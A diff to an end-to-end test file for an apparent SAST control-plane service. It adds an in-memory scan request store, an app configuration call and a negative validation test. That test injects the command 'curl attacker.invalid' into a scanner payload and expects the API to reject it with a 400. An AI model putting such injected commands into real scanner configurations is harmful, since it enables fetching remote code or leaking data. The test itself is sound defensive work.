@@ -5,7 +5,10 @@ import request from "supertest";
 import { SessionAuthGuard } from '../../src/auth/guards/session-auth.guard';
 import { GithubWebhookSignatureGuard } from '../../src/common/security/github-webhook-signature.guard';
 import { InternalServiceGuard } from '../../src/common/security/internal-service.guard';
+import { configureApp } from '../../src/bootstrap/configure-app';
+import { ControlPlaneScanRequestStore } from '../../src/control-plane/control-plane-scan-request.store';
 import { SastQueueAdmissionStore } from '../../src/control-plane/sast-queue-admission.store';
+import { InMemoryControlPlaneScanRequestStore } from '../support/in-memory-control-plane-scan-request.store';
 import { InMemorySastQueueAdmissionStore } from '../support/in-memory-sast-queue-admission.store';
 import {
   TestGithubWebhookSignatureGuard,
@@ -192,6 +195,8 @@ describe("Control Plane skeleton (e2e)", () => {
       })
       .overrideProvider(GitlabCloudIntegrationClient)
       .useValue(gitlabCloudIntegrationClientMock)
+      .overrideProvider(ControlPlaneScanRequestStore)
+      .useValue(new InMemoryControlPlaneScanRequestStore())
       .overrideProvider(SastQueueAdmissionStore)
       .useValue(new InMemorySastQueueAdmissionStore())
       .overrideGuard(SessionAuthGuard)
@@ -203,8 +208,7 @@ describe("Control Plane skeleton (e2e)", () => {
       .compile();
 
     app = moduleRef.createNestApplication();
-    app.setGlobalPrefix("api");
-
+    await configureApp(app);
     await app.init();
   });
 
@@ -575,9 +579,7 @@ describe("Control Plane skeleton (e2e)", () => {
       status: "QUEUED"
     });
 
-    const planning = await request(app.getHttpServer())
-      .post(`/api/sast-planning/${scanData.id}`)
-      .send({
+    const planningPayload = {
         tenantId: "tenant_beta",
         repositoryMetadata: {
           repositoryBindingId,
@@ -615,7 +617,18 @@ describe("Control Plane skeleton (e2e)", () => {
           queuedInLane: 0
         },
         requestedAt: '2026-07-22T01:00:00Z'
+      };
+    await request(app.getHttpServer())
+      .post(`/api/sast-planning/${scanData.id}`)
+      .send({
+        ...planningPayload,
+        scannerSet: { ...planningPayload.scannerSet, command: 'curl attacker.invalid' }
       })
+      .expect(400);
+
+    const planning = await request(app.getHttpServer())
+      .post(`/api/sast-planning/${scanData.id}`)
+      .send(planningPayload)
       .expect(201);
     const planningData = dataOf<Record<string, unknown>>(planning.body);
     expect(planningData.planning).toMatchObject({
